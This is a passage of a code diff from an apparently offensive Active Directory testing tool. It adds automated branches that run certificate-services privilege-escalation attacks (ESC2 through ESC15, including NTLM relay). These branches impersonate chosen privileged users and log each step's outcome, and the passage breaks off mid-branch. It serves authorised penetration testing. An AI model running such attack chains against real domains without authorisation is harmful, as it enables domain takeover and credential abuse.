@@ -6388,6 +8249,18 @@ def execute_selected_attack_path(
                             template=agent_template,
                             client_auth_template=client_auth_template,
                         )
+                    )
+                    if not esc3_success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC3",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": agent_template,
+                            },
+                        )
+                        return execution_started
                 continue
 
             if key == "adcsesc4":
@@ -6557,7 +8430,10 @@ def execute_selected_attack_path(
                     action="ADCSESC4",
                     from_label=from_label,
                     to_label=to_label,
-                    notes={"username": exec_username, "template": template},
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
                 ):
                     try:
                         update_edge_status_by_labels(
@@ -6567,18 +8443,17 @@ def execute_selected_attack_path(
                             relation="ADCSESC4",
                             to_label=to_label,
                             status="attempted",
-                            notes={"username": exec_username, "template": template},
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
                         )
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
-                    if hasattr(shell, "adcs_esc4"):
-                        shell.adcs_esc4(  # type: ignore[attr-defined]
-                            domain, exec_username, password, template
-                        )
-                    else:
-                        from adscan_internal.cli.adcs_exploitation import adcs_esc4
+                    from adscan_internal.cli.adcs_exploitation import adcs_esc4
 
+                    esc4_success = bool(
                         adcs_esc4(
                             shell,
                             domain=domain,
@@ -6586,6 +8461,18 @@ def execute_selected_attack_path(
                             password=password,
                             template=template,
                         )
+                    )
+                    if not esc4_success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC4",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
                 continue
 
             if key == "adcsesc13":
@@ -6670,6 +8557,7 @@ def execute_selected_attack_path(
                     details=details,
                     to_label=to_label,
                     domain_data=domain_data,
+                    allow_target_label_template=False,
                 )
                 if not esc13_templates:
                     manual_template = _prompt_for_manual_adcs_template(esc_number="13")
@@ -6698,7 +8586,9 @@ def execute_selected_attack_path(
                 if not template:
                     print_warning("ESC13 execution cancelled.")
                     return execution_started
-                effective_group = _extract_effective_group_from_step_details(details)
+                effective_group = _extract_effective_group_from_step_details(
+                    details
+                ) or _attack_path_label_to_name(to_label)
 
                 execution_started = True
                 with _active_step_context(
@@ -6707,7 +8597,7 @@ def execute_selected_attack_path(
                     to_label=to_label,
                     notes={
                         "username": exec_username,
-                        "template": template,
+                        "template_used_for_run": template,
                         **(
                             {"effective_group": effective_group}
                             if effective_group
@@ -6718,7 +8608,7 @@ def execute_selected_attack_path(
                     try:
                         notes = {
                             "username": exec_username,
-                            "template": template,
+                            "template_used_for_run": template,
                             **(
                                 {"effective_group": effective_group}
                                 if effective_group
@@ -6737,17 +8627,9 @@ def execute_selected_attack_path(
                     except Exception as exc:  # noqa: BLE001
                         telemetry.capture_exception(exc)
 
-                    if hasattr(shell, "adcs_esc13"):
-                        shell.adcs_esc13(  # type: ignore[attr-defined]
-                            domain,
-                            exec_username,
-                            password,
-                            template,
-                            effective_group=effective_group,
-                        )
-                    else:
-                        from adscan_internal.cli.adcs_exploitation import adcs_esc13
+                    from adscan_internal.cli.adcs_exploitation import adcs_esc13
 
+                    esc13_success = bool(
                         adcs_esc13(
                             shell,
                             domain=domain,
@@ -6756,6 +8638,1095 @@ def execute_selected_attack_path(
                             template=template,
                             effective_group=effective_group,
                         )
+                    )
+                    if not esc13_success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC13",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                continue
+
+            if key == "adcsesc2":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute ADCSESC2: missing from/to details.")
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        "ADCSESC2",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        "ADCSESC2",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if not domain_data.get("pdc") or not domain_data.get("ca"):
+                    _mark_blocked_step(
+                        "ADCSESC2",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/CA info in domain data",
+                    )
+                    return execution_started
+                esc_templates = _resolve_adcs_template_candidates(
+                    shell,
+                    domain=domain,
+                    exec_username=exec_username,
+                    password=password,
+                    esc_number="2",
+                    details=details,
+                    to_label=to_label,
+                    domain_data=domain_data,
+                )
+                template = esc_templates[0] if esc_templates else None
+                if not template:
+                    template = _prompt_for_manual_adcs_template(esc_number="2")
+                if not template:
+                    print_warning("No ESC2 template found or selected.")
+                    return execution_started
+                from adscan_internal.cli.privileged_target_selection import (
+                    resolve_privileged_target_user,
+                )
+
+                esc2_target_user = resolve_privileged_target_user(
+                    shell,
+                    domain=domain,
+                    purpose="ESC2 on-behalf-of certificate request",
+                )
+                if not esc2_target_user:
+                    print_warning(
+                        "ESC2 execution cancelled: no privileged target selected."
+                    )
+                    return execution_started
+                esc2_target_upn = f"{esc2_target_user}@{domain}"
+                execution_started = True
+                with _active_step_context(
+                    action="ADCSESC2",
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation="ADCSESC2",
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
+                    from adscan_internal.cli.adcs_exploitation import (
+                        _resolve_template_min_key_size,
+                    )
+
+                    esc_cfg = EscConfig(
+                        esc=2,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=str(
+                            domain_data.get("adcs")
+                            or domain_data.get("pdc_hostname")
+                            or domain_data.get("pdc")
+                            or ""
+                        ),
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=template,
+                        username=exec_username,
+                        password=password,
+                        target_upn=esc2_target_upn,
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=_resolve_ca_fqdn(domain_data),
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
+                    )
+                    esc2_result = run_esc_sync(esc_cfg)
+                    if not esc2_result.success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC2",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        "ADCSESC2",
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
+                continue
+
+            if key == "adcsesc6":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute ADCSESC6: missing from/to details.")
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        "ADCSESC6",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        "ADCSESC6",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if not domain_data.get("pdc") or not domain_data.get("ca"):
+                    _mark_blocked_step(
+                        "ADCSESC6",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/CA info in domain data",
+                    )
+                    return execution_started
+                esc_templates = _resolve_adcs_template_candidates(
+                    shell,
+                    domain=domain,
+                    exec_username=exec_username,
+                    password=password,
+                    esc_number="6",
+                    details=details,
+                    to_label=to_label,
+                    domain_data=domain_data,
+                )
+                template = esc_templates[0] if esc_templates else None
+                if not template:
+                    template = _prompt_for_manual_adcs_template(esc_number="6")
+                if not template:
+                    print_warning("No ESC6 template found or selected.")
+                    return execution_started
+                from adscan_internal.cli.privileged_target_selection import (
+                    resolve_privileged_target_user,
+                )
+
+                esc6_target_user = resolve_privileged_target_user(
+                    shell,
+                    domain=domain,
+                    purpose="ESC6 certificate request",
+                )
+                if not esc6_target_user:
+                    print_warning(
+                        "ESC6 execution cancelled: no privileged target selected."
+                    )
+                    return execution_started
+                esc6_target_upn = f"{esc6_target_user}@{domain}"
+                execution_started = True
+                with _active_step_context(
+                    action="ADCSESC6",
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation="ADCSESC6",
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
+                    from adscan_internal.cli.adcs_exploitation import (
+                        _resolve_template_min_key_size,
+                    )
+
+                    esc_cfg = EscConfig(
+                        esc=6,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=str(
+                            domain_data.get("adcs")
+                            or domain_data.get("pdc_hostname")
+                            or domain_data.get("pdc")
+                            or ""
+                        ),
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=template,
+                        username=exec_username,
+                        password=password,
+                        target_upn=esc6_target_upn,
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=_resolve_ca_fqdn(domain_data),
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
+                    )
+                    esc6_result = run_esc_sync(esc_cfg)
+                    if not esc6_result.success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC6",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        "ADCSESC6",
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
+                continue
+
+            if key == "adcsesc7":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute ADCSESC7: missing from/to details.")
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        "ADCSESC7",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        "ADCSESC7",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if not domain_data.get("pdc") or not domain_data.get("ca"):
+                    _mark_blocked_step(
+                        "ADCSESC7",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/CA info in domain data",
+                    )
+                    return execution_started
+                from adscan_internal.cli.privileged_target_selection import (
+                    resolve_privileged_target_user,
+                )
+
+                esc7_target_user = resolve_privileged_target_user(
+                    shell,
+                    domain=domain,
+                    purpose="ESC7 certificate request",
+                )
+                if not esc7_target_user:
+                    print_warning(
+                        "ESC7 execution cancelled: no privileged target selected."
+                    )
+                    return execution_started
+                esc7_target_upn = f"{esc7_target_user}@{domain}"
+                execution_started = True
+                with _active_step_context(
+                    action="ADCSESC7",
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={"username": exec_username},
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation="ADCSESC7",
+                            to_label=to_label,
+                            status="attempted",
+                            notes={"username": exec_username},
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
+                    esc_cfg = EscConfig(
+                        esc=7,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=str(
+                            domain_data.get("adcs")
+                            or domain_data.get("pdc_hostname")
+                            or domain_data.get("pdc")
+                            or ""
+                        ),
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=None,
+                        username=exec_username,
+                        password=password,
+                        target_upn=esc7_target_upn,
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=_resolve_ca_fqdn(domain_data),
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                    )
+                    esc7_result = run_esc_sync(esc_cfg)
+                    if not esc7_result.success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC7",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        "ADCSESC7",
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
+                continue
+
+            if key in {"adcsesc8", "adcsesc11", "coerceandrelayntlmtoadcs"}:
+                esc_number = 11 if key == "adcsesc11" else 8
+                action_name = f"ADCSESC{esc_number}"
+                if not from_label or not to_label:
+                    print_warning(
+                        f"Cannot execute {action_name}: missing from/to details."
+                    )
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        action_name,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        action_name,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if (
+                    not domain_data.get("pdc")
+                    or not domain_data.get("adcs")
+                    or not domain_data.get("ca")
+                ):
+                    _mark_blocked_step(
+                        action_name,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/ADCS/CA info in domain data",
+                    )
+                    return execution_started
+
+                template = "DomainController"
+                detail_templates = _extract_cert_templates_from_step_details(details)
+                if detail_templates:
+                    from adscan_internal.cli.adcs_exploitation import _resolve_template_cn
+
+                    template = _resolve_template_cn(shell, domain, str(detail_templates[0]).strip()) or template
+
+                ca_host = str(domain_data.get("adcs") or "")
+                ca_fqdn = (
+                    ca_host
+                    if ca_host and not re.fullmatch(r"\d+(?:\.\d+){3}", ca_host)
+                    else None
+                )
+                execution_started = True
+                with _active_step_context(
+                    action=action_name,
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action_name,
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
+                    esc_cfg = EscConfig(
+                        esc=esc_number,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=ca_host,
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=template,
+                        username=exec_username,
+                        password=password,
+                        target_upn=_resolve_target_upn(to_label, domain),
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=ca_fqdn,
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                    )
+                    esc8_result = run_esc_sync(esc_cfg)
+                    if not esc8_result.success:
+                        _handle_failed_adcs_step(
+                            action_name,
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        action_name,
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
+                    if esc8_result.pfx_path and hasattr(shell, "ptc_certipy"):
+                        shell.ptc_certipy(domain, esc8_result.pfx_path)
+                continue
+
+            if key == "adcsesc9":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute ADCSESC9: missing from/to details.")
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        "ADCSESC9",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        "ADCSESC9",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if not domain_data.get("pdc") or not domain_data.get("ca"):
+                    _mark_blocked_step(
+                        "ADCSESC9",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/CA info in domain data",
+                    )
+                    return execution_started
+                esc_templates = _resolve_adcs_template_candidates(
+                    shell,
+                    domain=domain,
+                    exec_username=exec_username,
+                    password=password,
+                    esc_number="9",
+                    details=details,
+                    to_label=to_label,
+                    domain_data=domain_data,
+                )
+                template = esc_templates[0] if esc_templates else None
+                if not template:
+                    template = _prompt_for_manual_adcs_template(esc_number="9")
+                if not template:
+                    print_warning("No ESC9 template found or selected.")
+                    return execution_started
+                # ESC9 requires a puppet account: the writer modifies its UPN
+                # and msDS-KeyCredentialLink to impersonate a privileged user.
+                # The puppet is stored in vulnerable_resources with role=puppet
+                # when the precondition collector derived the edge correctly.
+                esc9_puppet = _resolve_esc9_puppet_user(details or {}, domain)
+                if not esc9_puppet:
+                    _mark_blocked_step(
+                        "ADCSESC9",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason=(
+                            "No puppet user found in edge notes. Re-collect to populate "
+                            "the writer-mediated precondition before executing ESC9."
+                        ),
+                    )
+                    print_warning(
+                        "ESC9 execution blocked: puppet user precondition not met. "
+                        "Re-run collection to resolve the writer->puppet->template chain."
+                    )
+                    return execution_started
+                from adscan_internal.cli.privileged_target_selection import (
+                    resolve_privileged_target_user,
+                )
+
+                esc9_target_user = resolve_privileged_target_user(
+                    shell,
+                    domain=domain,
+                    purpose="ESC9 certificate request",
+                )
+                if not esc9_target_user:
+                    print_warning(
+                        "ESC9 execution cancelled: no privileged target selected."
+                    )
+                    return execution_started
+                esc9_target_upn = f"{esc9_target_user}@{domain}"
+                execution_started = True
+                with _active_step_context(
+                    action="ADCSESC9",
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                        "puppet_account": esc9_puppet,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation="ADCSESC9",
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                                "puppet_account": esc9_puppet,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
+                    from adscan_internal.cli.adcs_exploitation import (
+                        _resolve_template_min_key_size,
+                    )
+
+                    esc_cfg = EscConfig(
+                        esc=9,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=str(
+                            domain_data.get("adcs")
+                            or domain_data.get("pdc_hostname")
+                            or domain_data.get("pdc")
+                            or ""
+                        ),
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=template,
+                        username=exec_username,
+                        password=password,
+                        target_upn=esc9_target_upn,
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=_resolve_ca_fqdn(domain_data),
+                        target_account=esc9_puppet,
+                        target_account_dn=_resolve_esc9_puppet_dn(details or {}) or "",
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
+                    )
+                    esc9_result = run_esc_sync(esc_cfg)
+                    if not esc9_result.success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC9",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        "ADCSESC9",
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
+                continue
+
+            if key == "adcsesc14":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute ADCSESC14: missing from/to details.")
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        "ADCSESC14",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        "ADCSESC14",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if not domain_data.get("pdc") or not domain_data.get("ca"):
+                    _mark_blocked_step(
+                        "ADCSESC14",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/CA info in domain data",
+                    )
+                    return execution_started
+                esc_templates = _resolve_adcs_template_candidates(
+                    shell,
+                    domain=domain,
+                    exec_username=exec_username,
+                    password=password,
+                    esc_number="14",
+                    details=details,
+                    to_label=to_label,
+                    domain_data=domain_data,
+                )
+                template = esc_templates[0] if esc_templates else None
+                if not template:
+                    template = _prompt_for_manual_adcs_template(esc_number="14")
+                if not template:
+                    print_warning("No ESC14 template found or selected.")
+                    return execution_started
+                execution_started = True
+                with _active_step_context(
+                    action="ADCSESC14",
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation="ADCSESC14",
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
+                    esc14_puppet = _resolve_esc9_puppet_user(details or {}, domain)
+                    if not esc14_puppet:
+                        _mark_blocked_step(
+                            "ADCSESC14",
+                            from_label,
+                            to_label,
+                            kind="unavailable",
+                            reason="No puppet account with writable altSecurityIdentities found in edge notes — re-run the collector to populate",
+                        )
+                        return execution_started
+                    from adscan_internal.cli.adcs_exploitation import (
+                        _resolve_template_min_key_size,
+                    )
+
+                    esc_cfg = EscConfig(
+                        esc=14,
+                        domain=domain,
+                        auth_domain=domain,
+                        dc_ip=str(domain_data.get("pdc") or ""),
+                        auth_kdc=str(domain_data.get("pdc") or ""),
+                        ca_host=str(
+                            domain_data.get("adcs")
+                            or domain_data.get("pdc_hostname")
+                            or domain_data.get("pdc")
+                            or ""
+                        ),
+                        ca_name=str(domain_data.get("ca") or ""),
+                        template=template,
+                        username=exec_username,
+                        password=password,
+                        target_upn=_resolve_target_upn(to_label, domain),
+                        workspace_dir=_resolve_workspace_dir(shell, domain),
+                        shell=shell,
+                        ca_fqdn=_resolve_ca_fqdn(domain_data),
+                        target_account=esc14_puppet,
+                        target_account_dn=_resolve_esc9_puppet_dn(details or {}) or "",
+                        dc_fqdn=(
+                            domain_data.get("dc_fqdn")
+                            or domain_data.get("pdc_hostname")
+                            or None
+                        ),
+                        min_key_size=_resolve_template_min_key_size(shell, domain, "Machine"),
+                    )
+                    esc14_result = run_esc_sync(esc_cfg)
+                    if not esc14_result.success:
+                        _handle_failed_adcs_step(
+                            "ADCSESC14",
+                            from_label,
+                            to_label,
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                        return execution_started
+                    _handle_successful_adcs_step(
+                        "ADCSESC14",
+                        from_label,
+                        to_label,
+                        notes={
+                            "username": exec_username,
+                            "template_used_for_run": template,
+                        },
+                    )
+                continue
+
+            if key == "adcsesc15":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute ADCSESC15: missing from/to details.")
+                    return execution_started
+                exec_username = _resolve_execution_user(
+                    shell,
+                    domain=domain,
+                    context_username=context_username,
+                    summary=summary,
+                    from_label=from_label,
+                )
+                if not exec_username:
+                    _mark_blocked_step(
+                        "ADCSESC15",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing execution user context",
+                    )
+                    return execution_started
+                password = context_password or _resolve_domain_password(
+                    shell, domain, exec_username
+                )
+                if not password:
+                    _mark_blocked_step(
+                        "ADCSESC15",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing credential",
+                    )
+                    return execution_started
+                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+                if not isinstance(domain_data, dict):
+                    domain_data = {}
+                if not domain_data.get("pdc") or not domain_data.get("ca"):
+                    _mark_blocked_step(
+                        "ADCSESC15",
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing PDC/CA info in domain data",
+                    )
+                    return execution_started
+                esc_templates = _resolve_adcs_template_candidates(
+                    shell,
+                    domain=domain,
+                    exec_username=exec_username,
+                    password=password,
+                    esc_number="15",
+                    details=details,
+                    to_label=to_label,
+                    domain_data=domain_data,
+                )
+                template = esc_templates[0] if esc_templates else None
+                if not template:
+                    template = _prompt_for_manual_adcs_template(esc_number="15")
+                if not template:
+                    print_warning("No ESC15 template found or selected.")
+                    return execution_started
+                from adscan_internal.cli.privileged_target_selection import (
+                    resolve_privileged_target_user,
+                )
+
+                esc15_target_user = resolve_privileged_target_user(
+                    shell,
+                    domain=domain,
+                    purpose="ESC15 on-behalf-of certificate request",
+                )
+                if not esc15_target_user:
+                    print_warning(
+                        "ESC15 execution cancelled: no privileged target selected."
+                    )
+                    return execution_started
+                esc15_target_upn = f"{esc15_target_user}@{domain}"
+                execution_started = True
+                with _active_step_context(
+                    action="ADCSESC15",
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "template_used_for_run": template,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation="ADCSESC15",
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "template_used_for_run": template,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
+                    from adscan_internal.services.adcs.esc_types import EscConfig
+
